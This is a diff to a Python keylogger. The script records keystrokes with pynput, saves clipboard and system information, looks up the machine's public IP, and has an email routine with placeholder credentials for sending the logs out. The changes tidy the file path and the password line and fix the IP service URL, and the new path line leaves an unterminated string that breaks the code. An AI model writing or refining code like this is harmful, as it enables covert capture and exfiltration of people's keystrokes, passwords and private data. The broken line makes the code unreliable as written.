@@ -22,7 +22,7 @@ from pynput import keyboard
 
 #creating file to store log and file path
 keys_information ="key_log.txt"
-file_path = "C:\\Users\\Netsi\\Desktop\\YN\\hilcoe\\Github\\keylogger-updated-"
+file_path = "./logs/""
 system_information="systeminfo.txt"
 clipboard_information="clipboardinfo.txt"
 #allows to add an extention to access keylog.txt file
@@ -67,7 +67,7 @@ with Listener(on_press = on_press, on_release=on_release) as listener:
 
 #email
 email_address="your_email@example.com"
-password =                                                                                                                                                                                                                     "your_app_specific_password"
+password = "your_app_specific_password"
 toaddr ="your_email@example.com"
 
 def send_email(filename,attachment,toaddr):
@@ -106,7 +106,7 @@ def computer_information():
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
-            public_ip= get("https://api.apify.org").text
+            public_ip= get("https://api.ipify.org").text
             f.write("public IP Address: "+ public_ip)
         except Exception:
             f.write("couldn't get public ip")
